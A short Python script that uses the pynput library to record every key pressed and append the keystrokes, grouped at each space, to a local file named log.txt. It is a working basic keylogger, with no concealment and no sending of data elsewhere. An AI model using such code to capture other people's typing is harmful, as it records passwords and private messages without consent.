
from pynput import keyboard


word = ""

def on_press(key):
    global word
    try:
        current = str(key.char)
    except AttributeError:
        if key == key.space:
            current = " "
            write_word()
        else:
            current = " " + str(key) + " "
    word += current

def write_word():
    global word
    with open("log.txt", "a") as f:
        f.write(word)
        f.write("\n")
    word = ""




# Create a listener object
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()

# Wait for the listener to stop
listener.join()

